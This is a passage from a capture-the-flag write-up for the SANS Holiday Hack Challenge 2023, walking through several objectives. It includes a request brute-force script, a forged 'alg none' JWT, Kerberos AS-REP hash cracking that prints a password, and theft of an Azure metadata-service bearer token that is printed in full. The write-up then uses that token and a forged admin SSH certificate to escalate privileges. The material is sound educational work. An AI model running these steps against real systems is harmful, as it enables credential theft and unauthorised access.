\"hhc23-phishdetect-dot-holidayhack2023.ue.r.appspot.com\"\n}\ncookies = {\n    \"CaseFile\": \"eyJ1c2VyaWQiOiIyMGFjYTQxNy02YzU4LTRjMDctOGJlZC0yZGIzNDdjMThhYzcifQ.ZYISBg.q7sm93Whv-a2MAJIxFfZkZ88fvI\"\n}\n\n# Initialize the POST request counter\npost_request_count = 0\n\n# Generate combinations of email addresses\nfor i in range(len(email_addresses)):\n    for combination in itertools.combinations(email_addresses, i):\n        # Convert the combination to a JSON list\n        json_data = list(combination)\n\n        # Make the POST request\n        response = requests.post(url, json=json_data, headers=headers, cookies=cookies)\n        post_request_count += 1\n        # Print the response (or handle it as needed)\n        print(f\"Combination: {json_data}, Response: {response.status_code}, Body: {response.text}\")\n        time.sleep(1)\n        print(f\"Number of requests: {post_request_count}\")\n        # Add any additional logic or error handling as needed\nprint(f\"Total number of POST requests made: {post_request_count}\")\n</code></pre>"},{"location":"objectives/o13/#chatgpt-alternative","title":"ChatGPT Alternative","text":"<p>Alternative solution using ChatGPT App \"Phish Detect\":</p> <p></p> <p>ChatGPT Mail 1 - Clean</p> <p>Overall, while the email appears legitimate based on the information provided, it's important to remain cautious. If you have any doubts about the authenticity of the email, you can take additional steps such as directly contacting the sender through known official channels or checking with your IT department. Remember, it's always better to be safe and verify, especially if any personal or sensitive information is involved.</p> <p>ChatGPT Mail 2 - Phishing</p> <p>Due to the mismatch between the sender's apparent domain and the actual domain of origin, combined with the failed DMARC authentication, this email is likely a phishing attempt. It's important not to respond to or click any links in this email. Instead, report it to your organization's IT department or the appropriate authority. Always verify the legitimacy of such emails through direct, official channels before taking any further action.</p>  ChatGPT Mail 2 - Full Response <p>This email has several warning signs that are commonly associated with phishing attempts:</p> <ol> <li> <p>Mismatched Email Addresses: The sender's address is <code>victor.davis@geeseislands.com</code>, but the return-path and the domain in the DKIM signature are from <code>anotherdomain.com</code>. This discrepancy is a major red flag, as it suggests that the email is not actually from the <code>geeseislands.com</code> domain it claims to be from.</p> </li> <li> <p>DMARC Status: The DMARC status is 'Fail'. This means that the email did not pass the domain's authentication checks, which is a strong indicator that it might be a phishing attempt.</p> </li> <li> <p>Reply-To Address: The reply-to address <code>admin.research@geeseislands.com</code> belongs to the <code>geeseislands.com</code> domain, but given the other discrepancies, this could be a tactic to make the email seem more legitimate.</p> </li> <li> <p>Content of the Email: While the content itself does not contain obvious phishing indicators such as urgent requests for personal information or suspicious links, the context, given the email discrepancies, should be approached with caution.</p> </li> </ol> <p>Due to the mismatch between the sender's apparent domain and the actual domain of origin, combined with the failed DMARC authentication, this email is likely a phishing attempt. It's important not to respond to or click any links in this email. Instead, report it to your organization's IT department or the appropriate authority. Always verify the legitimacy of such emails through direct, official channels before taking any further action.</p>"},{"location":"objectives/o13/#response","title":"Response","text":"<p>Fitzy Shortstack</p> <p>You've cracked the case! Once again, you've proven yourself to be an invaluable asset in our fight against these digital foes.</p>"},{"location":"objectives/o14/","title":"Elf Hunt","text":"<p>Difficulty:  Direct link: Objective Terminal</p>"},{"location":"objectives/o14/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here. You look like someone who's good with puzzles and games. I could really use your help with this Elf Hunt game I'm stuck on. I think it has something to do with manipulating JWTs, but I'm a bit lost. If you help me out, I might share some juicy secrets I've discovered. Let's just say things around here haven't been exactly... normal. So, what do ya say? Are you in? Oh, brilliant! I just know we'll crack this game together. I can't wait to see what we uncover, and remember, mum's the word!.</p>"},{"location":"objectives/o14/#hints","title":"Hints","text":"JWT Secrets Revealed <p>Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide. https://portswigger.net/web-security/jwt</p>"},{"location":"objectives/o14/#solution","title":"Solution","text":"<p>After inspecting web application we have found cookie is JWT Token decodable with CyberChef using JWT Decode.</p> <pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTUwMH0.\n\nAlso decoding using Base64 we got initial info:\n{\"alg\":\"none\",\"typ\":\"JWT\"}&gt;{\"speed\":-500}&gt;\n\ndecoded using JWT Decoder:\n{\n    \"speed\": -500\n}\n</code></pre> <p>Then encoded JWT Token into new hash with speed -100</p> <pre><code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzcGVlZCI6LTEwMCwiaWF0IjoxNzAzOTQxNDg2fQ.\n</code></pre> <p></p> <p>And after scroing 75 points we won game!</p> <p></p> <p>There was also captains journal which will be helpfull in Captain's comms challange.</p> <p></p> <p>Answer</p> <p>Score 75 points in terminal game</p>"},{"location":"objectives/o14/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend! What have you found there? The Captain's Journal? Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/o15/","title":"Hashcat","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o15/#objective","title":"Objective","text":"<p>Request</p> <p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys and take a crack at it!Insert the objective description from your badge.</p> Eve Snowshoes <p>I'm Eve Snowshoes, resident tech hobbyist, and I hear Alabaster is in quite the predicament. Our dear Alabaster forgot his password. He's been racking his jingle bells of memory with no luck. I've been trying to handle this password recovery thing parallel to this hashcat business myself but it seems like I am missing some tricks. So, what do you say, chief, ready to get your hands on some hashcat action and help a distraught elf out?</p>"},{"location":"objectives/o15/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o15/#solution","title":"Solution","text":"<p>We have been given access to Terminal where all files can be found under working directory: <pre><code>elf@638721c8f7c9:~$ ls\nHELP  hash.txt  password_list.txt\nelf@638721c8f7c9:~$\nelf@638721c8f7c9:~$ cat hash.txt \n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966elf@638721c8f7c9:~$\n</code></pre> * Determine the hash type in hash.txt and perform a wordlist cracking attempt to find which password is correct and submit it to /bin/runtoanswer .*</p> <p>Looking at help we determined hashtype and run command:   18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols</p> <pre><code>hashcat -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -m 18200 hash.txt password_list.txt --force\n</code></pre> <p>And this was final output:</p> <p></p> <p>INFO: All hashes found in potfile! Use --show to display them.</p> <pre><code>elf@266d5a6b8c66:~$ hashcat -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 -m 18200 hash.txt password_list.txt --force --show\n$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:22865a2bceeaa73227ea4021879eda02$8f07417379e610e2dcb0621462fec3675bb5a850aba31837d541e50c622dc5faee60e48e019256e466d29b4d8c43cbf5bf7264b12c21737499cfcb73d95a903005a6ab6d9689ddd2772b908fc0d0aef43bb34db66af1dddb55b64937d3c7d7e93a91a7f303fef96e17d7f5479bae25c0183e74822ac652e92a56d0251bb5d975c2f2b63f4458526824f2c3dc1f1fcbacb2f6e52022ba6e6b401660b43b5070409cac0cc6223a2bf1b4b415574d7132f2607e12075f7cd2f8674c33e40d8ed55628f1c3eb08dbb8845b0f3bae708784c805b9a3f4b78ddf6830ad0e9eafb07980d7f2e270d8dd1966:**IluvC4ndyC4nes!**\n</code></pre> <p></p> <p>Answer</p> <p>IluvC4ndyC4nes!</p>"},{"location":"objectives/o15/#response","title":"Response","text":"<p>Eve Snowshoes</p> <p>Aha! Success! Alabaster will undoubtedly be grateful for our assistance.</p>"},{"location":"objectives/o16/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o16/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org. ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea! It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver! I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy thisconfiguration to all the Geese Islands servers. Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list. If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently. Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/o16/#hints","title":"Hints","text":"SSH Certificates Talk <p>Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p> Azure Function App Source Code <p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from. https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01</p>"},{"location":"objectives/o16/#solution","title":"Solution","text":"<p>First of all we are provided with App URL where we can request certificates. https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</p> <p>We are asked to login to new Azure server at: ssh-server-vm.santaworkshopgeeseislands.org</p> <p>In order to login to ssh server we need to generate SSH Private Key and Public Cert</p> <pre><code>ssh-keygen -t ed25519\n</code></pre> <p>Now using generated key we can request certificate from web app:</p> <p></p> <p>Once generated, we need to copy specific part of it after ssh_cert: and create new file in our /home/user/.ssh folder called id_ed25519-cert.pub. Chmod newly created file with chmod 600.</p> <p>ssh -i /home/slingshot/.ssh/id_rsa monitor@ssh-server-vm.santaworkshopgeeseislands.org</p> <p>And we are in:</p> <p><pre><code>id_ed25519  id_ed25519-cert.pub  id_ed25519.pub\nlukasz@ls:~/.ssh$ ssh -i /home/lukasz/.ssh/id_ed25519 monitor@ssh-server-vm.santaworkshopgeeseislands.org\nThe authenticity of host 'ssh-server-vm.santaworkshopgeeseislands.org (20.253.83.128)' can't be established.\nED25519 key fingerprint is SHA256:8c+xYRFV/F12R5iWkNmoiLYwmcJU4tzF9hnHugARFC0.\nThis key is not known by any other names\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added 'ssh-server-vm.santaworkshopgeeseislands.org' (ED25519) to the list of known hosts.\nmonitor@ssh-server-vm:~$\n</code></pre> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Satellite Tracking Interface \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502            ____     __ ______             __                 \u2502\n\u2502           / __/__ _/ //_  __/______ _____/ /__ ____          \u2502\n\u2502          _\\ \\/ _ `/ __// / / __/ _ `/ __/  '_// __/          \u2502\n\u2502         /___/\\_,_/\\__//_/ /_/  \\_,_/\\__/_\\_\\/_/              \u2502\n\u2502                                                              \u2502\n\u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561\n\u2502                                                              \u2502\n\u2502  Position: 1.145134\u00b0, -145.261629\u00b0                           \u2502\n\u2502  Velocity: 3.0694 km/s                                       \u2502\n\u2502  Altitude: 35785.98 km above Earth's surface                 \u2502\n\u2502  Signal Strength: 88.12%                                     \u2502\n\u2502  Solar Panel Status: Deployed                                \u2502\n\u2502  Battery Status: Unknown                                     \u2502\n\u2502  Thermal Status: Unknown                                     \u2502\n\u2502                                                              \u2502\n\u2502          **** Geostationary orbit detected! ****             \u2502\n\u2502                                                              \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> Now once we are logged in we can explore filesystem. What is interesting we can see 2 ssh principles. Alabaster is our admin which we are looking for to access TODO list.</p> <p>monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls alabaster  monitor monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat * admin elf</p> <p>We need query metadata service to receive bearer token which will be required to query App service to get source control which was described in hint.</p> REQUEST<pre><code>monitor@ssh-server-vm:~$ curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s\n</code></pre> RESPONSE<pre><code>{\"access_token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQxMjk3NDYsIm5iZiI6MTcwNDEyOTc0NiwiZXhwIjoxNzA0MjE2NDQ2LCJhaW8iOiJFMlZnWURqNnkzNk91dlZSeFhJdHN5VTN6ZnFQQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI1WG1yZWJISElrbXoyT2FWaDFGZEJRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.gmkph7lUK5xFtvuLzdJXK7z9J-oTxT-2hjm0imMIB8Dr71RxUh2-cVbTX9q21sqddH2CQjrEMklEnh6UOjVc840X2YAM_pJz3eQXnbkPZAlwvRrEo0OHznXSU9DMn1S2CJ3oifV3OKBhwLIjnycd7EXitgyrmMQwLL2ZS6Z1liBJsyLrtWI4csHsOKg9rE0GZgLtV-G1YaV4iu5rv3qI52kWhXwu5GpgBuKQT_UHAlUEz_dJUVnDhk9SqDsgwfIO2upVR7q6a71rSWLRfT9XCl3V5jyQ-QoBLi2cFGz5lQQHWiYmw-lxUFTAFPrCOPNWpDEhzP1SdqDWOVQOuqpOIA\",\"client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"85606\",\"expires_on\":\"1704216446\",\"ext_expires_in\":\"86399\",\"not_before\":\"1704129746\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}monitor@ssh-server-vm:~$\n</code></pre> <p>We need to query Metadate service to check resources running in Azure:</p> <pre><code>REQUEST:\n\ncurl -s -H Metadata:true --noproxy \"*\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | jq\n\nOUTPUT:\n\n{\n  \"compute\": {\n    \"azEnvironment\": \"AzurePublicCloud\",\n    \"customData\": \"\",\n    \"evictionPolicy\": \"\",\n    \"isHostCompatibilityLayerVm\": \"false\",\n    \"licenseType\": \"\",\n    \"location\": \"eastus\",\n    \"name\": \"ssh-server-vm\",\n    \"offer\": \"\",\n    \"osProfile\": {\n      \"adminUsername\": \"\",\n      \"computerName\": \"\",\n      \"disablePasswordAuthentication\": \"\"\n    },\n    \"osType\": \"Linux\",\n    \"placementGroupId\": \"\",\n    \"plan\": {\n      \"name\": \"\",\n      \"product\": \"\",\n      \"publisher\": \"\"\n    },\n    \"platformFaultDomain\": \"0\",\n    \"platformUpdateDomain\": \"0\",\n    \"priority\": \"\",\n    \"provider\": \"Microsoft.Compute\",\n    \"publicKeys\": [],\n    \"publisher\": \"\",\n    \"resourceGroupName\": \"northpole-rg1\",\n    \"resourceId\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm\",\n    \"securityProfile\": {\n      \"secureBootEnabled\": \"false\",\n      \"virtualTpmEnabled\": \"false\"\n    },\n    \"sku\": \"\",\n    \"storageProfile\": {\n      \"dataDisks\": [],\n      \"imageReference\": {\n        \"id\": \"\",\n        \"offer\": \"\",\n        \"publisher\": \"\",\n        \"sku\": \"\",\n        \"version\": \"\"\n      },\n      \"osDisk\": {\n        \"caching\": \"ReadWrite\",\n        \"createOption\": \"Attach\",\n        \"diffDiskSettings\": {\n          \"option\": \"\"\n        },\n        \"diskSizeGB\": \"30\",\n        \"encryptionSettings\": {\n          \"enabled\": \"false\"\n        },\n        \"image\": {\n          \"uri\": \"\"\n        },\n        \"managedDisk\": {\n          \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Compute/disks/ssh-server-vm_os_disk\",\n          \"storageAccountType\": \"Standard_LRS\"\n        },\n        \"name\": \"ssh-server-vm_os_disk\",\n        \"osType\": \"Linux\",\n        \"vhd\": {\n          \"uri\": \"\"\n        },\n        \"writeAcceleratorEnabled\": \"false\"\n      },\n      \"resourceDisk\": {\n        \"size\": \"63488\"\n      }\n    },\n    \"subscriptionId\": \"2b0942f3-9bca-484b-a508-abdae2db5e64\",\n    \"tags\": \"Project:HHC23\",\n    \"tagsList\": [\n      {\n        \"name\": \"Project\",\n        \"value\": \"HHC23\"\n      }\n    ],\n    \"userData\": \"\",\n    \"version\": \"\",\n    \"vmId\": \"1f943876-80c5-4fc2-9a77-9011b0096c78\",\n    \"vmScaleSetName\": \"\",\n    \"vmSize\": \"Standard_B4ms\",\n    \"zone\": \"\"\n  },\n  \"network\": {\n    \"interface\": [\n      {\n        \"ipv4\": {\n          \"ipAddress\": [\n            {\n              \"privateIpAddress\": \"10.0.0.50\",\n              \"publicIpAddress\": \"\"\n            }\n          ],\n          \"subnet\": [\n            {\n              \"address\": \"10.0.0.0\",\n              \"prefix\": \"24\"\n            }\n          ]\n        },\n        \"ipv6\": {\n          \"ipAddress\": []\n        },\n        \"macAddress\": \"6045BDFE2D67\"\n      }\n    ]\n  }\n}\n</code></pre> <p>Now we build final query:</p> <p>Description for Gets the source control configuration of an app.</p> <p>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Web/sites/{name}/sourcecontrols/web?api-version=2022-03-01</p> REQUEST<pre><code>curl -H \"Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQxMjk3NDYsIm5iZiI6MTcwNDEyOTc0NiwiZXhwIjoxNzA0MjE2NDQ2LCJhaW8iOiJFMlZnWURqNnkzNk91dlZSeFhJdHN5VTN6ZnFQQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiI1WG1yZWJISElrbXoyT2FWaDFGZEJRIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.gmkph7lUK5xFtvuLzdJXK7z9J-oTxT-2hjm0imMIB8Dr71RxUh2-cVbTX9q21sqddH2CQjrEMklEnh6UOjVc840X2YAM_pJz3eQXnbkPZAlwvRrEo0OHznXSU9DMn1S2CJ3oifV3OKBhwLIjnycd7EXitgyrmMQwLL2ZS6Z1liBJsyLrtWI4csHsOKg9rE0GZgLtV-G1YaV4iu5rv3qI52kWhXwu5GpgBuKQT_UHAlUEz_dJUVnDhk9SqDsgwfIO2upVR7q6a71rSWLRfT9XCl3V5jyQ-QoBLi2cFGz5lQQHWiYmw-lxUFTAFPrCOPNWpDEhzP1SdqDWOVQOuqpOIA\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 | jq\n</code></pre> OUTPUT<pre><code>{\n  \"id\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web\",\n  \"name\": \"northpole-ssh-certs-fa\",\n  \"type\": \"Microsoft.Web/sites/sourcecontrols\",\n  \"location\": \"East US\",\n  \"tags\": {\n    \"project\": \"northpole-ssh-certs\",\n    \"create-cert-func-url-path\": \"/api/create-cert?code=candy-cane-twirl\"\n  },\n  \"properties\": {\n    \"repoUrl\": \"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa\",\n    \"branch\": \"main\",\n    \"isManualIntegration\": false,\n    \"isGitHubAction\": true,\n    \"deploymentRollbackEnabled\": false,\n    \"isMercurial\": false,\n    \"provisioningState\": \"Succeeded\",\n    \"gitHubActionConfiguration\": {\n      \"codeConfiguration\": null,\n      \"containerConfiguration\": null,\n      \"isLinux\": true,\n      \"generateWorkflowFile\": true,\n      \"workflowSettings\": {\n        \"appType\": \"functionapp\",\n        \"publishType\": \"code\",\n        \"os\": \"linux\",\n        \"variables\": {\n          \"runtimeVersion\": \"3.11\"\n        },\n        \"runtimeStack\": \"python\",\n        \"workflowApiVersion\": \"2020-12-01\",\n        \"useCanaryFusionServer\": false,\n        \"authType\": \"publishprofile\"\n      }\n    }\n  }\n}\n</code></pre> <p>Now we can see repo which is accessible here: https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa</p> <p>There is also source code for the app https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py</p> <p>Now to request ssh certificate for alabaster (admin role) principal we need to include that in our request to web app. As we could see in source code those two values are expected by app.  return PublicKey.from_string(ssh_pub_key), principal</p> <pre><code>awk '{print $1, $2}' ./id_ed25519.pub | sed 's/ /\": \"/' | sed 's/^/{\"/' | sed 's/$/\"}/' | sed 's/ssh-ed25519/ssh_pub_key/' |sed 's/: \"/: \"ssh-ed25519 /' &gt; postme\ncat postme | jq '. + {\"principal\": \"admin\"}' &gt; postme_admin \ncurl -X POST -H \"Content-Type: application/json\" -d @postme_admin 'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl' | jq -r .ssh_cert &gt; id_ed25519-cert.pub\n</code></pre> <p>Now we can login on admin account using alabaster login <pre><code>ssh -i /home/lukasz/.ssh/id_ed25519 alabaster@ssh-server-vm.santaworkshopgeeseislands.org\n</code></pre></p> <p>lukasz@ls:~/.ssh$ ssh -i /home/lukasz/.ssh/id_ed25519 alabaster@ssh-server-vm.santaworkshopgeeseislands.org alabaster@ssh-server-vm:~$ ls alabaster_todo.md  impacket alabaster@ssh-server-vm:~$ cat alabaster_todo.md</p>"},{"location":"objectives/o16/#geese-islands-it-security-todo-list","title":"Geese Islands IT &amp; Security Todo List","text":"<ul> <li> Sleigh GPS Upgrade: Integrate the new \"Island Hopper\" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.</li> <li> Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.</li> <li> Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!</li> <li> Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.</li> <li> Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!</li> <li> Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.</li> <li> Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.</li> </ul> <p>Answer</p> <p>Gingerbread</p>"},{"location":"objectives/o16/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App. Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil? Thanks for the help, I'll go and update the application code immediately! While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too. You might be wondering about that SatTrackr tool I've installed on the monitor account? Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands. I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us. No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/o17/","title":"Faster Lock Combination","text":"<p>Difficulty:  Direct link: Objective URL</p>"},{"location":"objectives/o17/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see 